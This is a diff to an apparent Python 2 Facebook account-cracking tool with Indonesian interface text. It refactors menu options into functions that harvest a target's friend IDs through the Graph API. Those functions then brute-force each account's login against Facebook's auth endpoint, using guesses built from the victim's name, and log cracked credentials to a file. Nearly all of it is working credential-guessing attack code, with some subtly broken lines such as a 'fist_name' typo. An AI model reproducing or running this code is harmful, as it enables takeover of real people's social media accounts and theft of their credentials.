@@ -552,39 +552,25 @@ def pilih_mbf():
 		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
 		mbf()
 	elif peak =="1":
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for s in z['data']:
-			id.append(s['id'])
+		konco()
 	elif peak =="2":
-		os.system('clear')
-		print logo
-		print 42*"\033[1;96m="
-		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
-		try:
-			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
-			op = json.loads(jok.text)
-			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
-		except KeyError:
-			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
-			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
-			mbf()
-			print "\033[1;91m[☆] \033[1;92mDate of birth\033[1;91m : "+op["birthday"]
-		except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'
-		jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
-		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
-		z = json.loads(r.text)
-		for i in z['data']:
-			id.append(i['id'])
+		dr_konco()
 	elif peak =="0":
 		menu()
 	else:
 		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
 		mbf()
+
+
+def konco():
+	os.system('clear')
+	print logo
+	print 42*"\033[1;96m="
+	jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+	r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+	z = json.loads(r.text)
+	for s in z['data']:
+		id.append(s['id'])
 	
 	print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
 	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
@@ -860,6 +846,288 @@ def pilih_mbf():
 																																	else:
 																																		if 'www.facebook.com' in q["error_msg"]:
 																																			print '\033[1;96m|\033[1;31mttl \033[1;96m|\033[1;93m '+b['birthday']
+																																			print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass16
+																																			cek = open("out/mbf_cp.txt", "a")
+																																			cek.write(user+"|"+pass16+"\n")
+																																			cek.close()
+																																			cp.append(user+pass16)
+
+
+		except:
+			pass
+		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print 42*"\033[1;96m="
+	print '\033[1;96m[✓] \033[1;93mSelesai \033[1;97m....'
+	print'\033[1;96m[✓] \033[1;34mTotal OK \033[1;34m: \033[1;93m'+str(len(oks))
+	print'\033[1;96m[✓] \033[1;93mTotal CP \033[1;93m : \033[1;97m'+str(len(cp))
+	print("\033[1;96m[✓] \033[1;34mcekpoint File tersimpan \033[1;91m: \033[1;31mout/mbf_cp.txt")
+	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+	mbf()
+
+
+def dr_konco():
+	os.system('clear')
+	print logo
+	print 42*"\033[1;96m="
+	idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[1;97m")
+	try:
+		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+		op = json.loads(jok.text)
+		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
+	except KeyError:
+		print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
+		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
+		mbf()
+	jalan('\033[1;96m[✺] \033[1;93mMengambil ID \033[1;97m...')
+	r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+	z = json.loads(r.text)
+	for i in z['data']:
+		id.append(i['id'])
+
+	print "\033[1;96m[+] \033[1;93mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
+	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+	print
+	pass1 = raw_input("\033[1;36m[1] \033[1;93mPassword \033[1;91m: \033[1;97m")
+	pass2 = raw_input("\033[1;36m[2] \033[1;93mPassword \033[1;91m: \033[1;97m")
+	pass3 = raw_input("\033[1;36m[3] \033[1;93mPassword \033[1;91m: \033[1;97m")
+	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
+	print 42*"\033[1;96m="
+	print "\033[96m| 😎 | " + 3*" " + "\033[35mIdentitas" + 4*" " + "\033[96m" + 5*" " + "\033[33mPassword" + 8*" " + "\033[96m"
+	print 42*"\033[1;96m="
+
+
+	def main(arg):
+		global cekpoint,oks
+		user = arg
+		try:
+			os.mkdir('out')
+		except OSError:
+			pass
+		try:
+			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			b = json.loads(a.text)
+			pass1
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			q = json.load(data)
+			if 'access_token' in q:
+				print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
+				oks.append(user+pass1)
+			else:
+				if 'www.facebook.com' in q["error_msg"]:
+					print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
+					cek = open("out/mbf_cp.txt", "a")
+					cek.write(user+"|"+pass1+"\n")
+					cek.close()
+					cp.append(user+pass1)
+				else:
+					pass2
+					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+					q = json.load(data)
+					if 'access_token' in q:
+						print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
+						oks.append(user+pass2)
+					else:
+						if 'www.facebook.com' in q["error_msg"]:
+							print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
+							cek = open("out/mbf_cp.txt", "a")
+							cek.write(user+"|"+pass2+"\n")
+							cek.close()
+							cp.append(user+pass2)
+						else:
+							pass3
+							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							q = json.load(data)
+							if 'access_token' in q:
+								print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
+								oks.append(user+pass3)
+							else:
+								if 'www.facebook.com' in q["error_msg"]:
+									print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
+									cek = open("out/mbf_cp.txt", "a")
+									cek.write(user+"|"+pass3+"\n")
+									cek.close()
+									cp.append(user+pass3)
+								else:
+									pass4 = b['first_name'] + '123'
+									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									q = json.load(data)
+									if 'access_token' in q:
+										print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
+										oks.append(user+pass4)
+									else:
+										if 'www.facebook.com' in q["error_msg"]:
+											print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
+											cek = open("out/mbf_cp.txt", "a")
+											cek.write(user+"|"+pass4+"\n")
+											cek.close()
+											cp.append(user+pass4)
+										else:
+											pass5 = b['last_name'] + '12345'
+											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+											q = json.load(data)
+											if 'access_token' in q:
+												print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
+												oks.append(user+pass5)
+											else:
+												if 'www.facebook.com' in q["error_msg"]:
+													print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
+													cek = open("out/mbf_cp.txt", "a")
+													cek.write(user+"|"+pass5+"\n")
+													cek.close()
+													cp.append(user+pass5)
+												else:
+													pass6 = b['first_name'] + '12'
+													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													q = json.load(data)
+													if 'access_token' in q:
+														print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
+														oks.append(user+pass6)
+													else:
+														if 'www.facebook.com' in q["error_msg"]:
+															print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
+															cek = open("out/mbf_cp.txt", "a")
+															cek.write(user+"|"+pass6+"\n")
+															cek.close()
+															cp.append(user+pass6)
+														else:
+															pass7 = b['first_name']
+															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+															q = json.load(data)
+															if 'access_token' in q:
+																print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
+																oks.append(user+pass7)
+															else:
+																if 'www.facebook.com' in q["error_msg"]:
+																	print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
+																	cek = open("out/mbf_cp.txt", "a")
+																	cek.write(user+"|"+pass7+"\n")
+																	cek.close()
+																	cp.append(user+pass7)
+																else:
+																	pass8 = b['first_name'] + '12345'
+																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																	q = json.load(data)
+																	if 'access_token' in q:
+																		print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
+																		oks.append(user+pass8)
+																		if 'www.facebook.com' in q["error_msg"]:
+																			print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass8
+																			cek = open("out/mbf_cp.txt", "a")
+																			cek.write(user+"|"+pass8+"\n")
+																			cek.close()
+																			cp.append(user+pass8)
+																		else:
+																			pass9 = b['first_name'] + 'khan'
+																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																			q = json.load(data)
+																			if 'access_token' in q:
+																				print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9
+																				oks.append(user+pass9)
+																			else:
+																				if 'www.facebook.com' in q["error_msg"]:
+																					print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass9
+																					cek = open("out/mbf_cp.txt", "a")
+																					cek.write(user+"|"+pass9+"\n")
+																					cek.close()
+																					cp.append(user+pass9)
+																				else:
+																					pass10 = b['last_name'] + '123'
+																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																					q = json.load(data)
+																					if 'access_token' in q:
+																						print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10
+																						oks.append(user+pass10)
+																					else:
+																						if 'www.facebook.com' in q["error_msg"]:
+																							print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass10
+																							cek = open("out/mbf_cp.txt", "a")
+																							cek.write(user+"|"+pass10+"\n")
+																							cek.close()
+																							cp.append(user+pass10)
+																						else:
+																							pass11 = b['first_name'] + '111'
+																							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																							q = json.load(data)
+																							if 'access_token' in q:
+																								print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11
+																								oks.append(user+pass11)
+																							else:
+																								if 'www.facebook.com' in q["error_msg"]:
+																									print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11
+																									cek = open("out/mbf_cp.txt", "a")
+																									cek.write(user+"|"+pass11+"\n")
+																									cek.close()
+																									cp.append(user+pass11)
+																								else:
+																									pass12 = b['first_name'] + '@123'
+																									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																									q = json.load(data)
+																									if 'access_token' in q:
+																										print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12
+																										oks.append(user+pass12)
+																									else:
+																										if 'www.facebook.com' in q["error_msg"]:
+																											print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass12
+																											cek = open("out/mbf_cp.txt", "a")
+																											cek.write(user+"|"+pass12+"\n")
+																											cek.close()
+																											cp.append(user+pass12)
+																										else:
+																											pass13 = b['first_name'] + '1234'
+																											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																											q = json.load(data)
+																											if 'access_token' in q:
+																												print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass13
+																												oks.append(user+pass13)
+																											else:
+																												if 'www.facebook.com' in q["error_msg"]:
+																													print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass13
+																													cek = open("out/mbf_cp.txt", "a")
+																													cek.write(user+"|"+pass13+"\n")
+																													cek.close()
+																													cp.append(user+pass13)
+																												else:
+																													pass14 = b['fist_name'] + '007'
+																													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass14)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																													q = json.load(data)
+																													if 'access_token' in q:
+																														print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass14
+																														oks.append(user+pass14)
+																													else:
+																														if 'www.facebook.com' in q["error_msg"]:
+																															print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass14
+																															cek = open("out/mbf_cp.txt", "a")
+																															cek.write(user+"|"+pass14+"\n")
+																															cek.close()
+																															cp.append(user+pass14)
+																														else:
+																															pass15 = b['last_name'] + '1234'
+																															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass15)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																															q = json.load(data)
+																															if 'access_token' in q:
+																																print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass15
+																																oks.append(user+pass15)
+																															else:
+																																if 'www.facebook.com' in q["error_msg"]:
+																																	print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass15
+																																	cek = open("out/mbf_cp.txt", "a")
+																																	cek.write(user+"|"+pass15+"\n")
+																																	cek.close()
+																																	cp.append(user+pass15)
+																																else:
+																																	pass16 = b['first_name'] + '786'
+																																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass16)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+																																	q = json.load(data)
+																																	if 'access_token' in q:
+																																		print '\x1b[1;96m| \x1b[1;34mOK \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass16
+																																		oks.append(user+pass16)
+																																	else:
+																																		if 'www.facebook.com' in q["error_msg"]:
 																																			print '\x1b[1;96m| \x1b[1;93mCP \x1b[1;96m|\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass16
 																																			cek = open("out/mbf_cp.txt", "a")
 																																			cek.write(user+"|"+pass16+"\n")
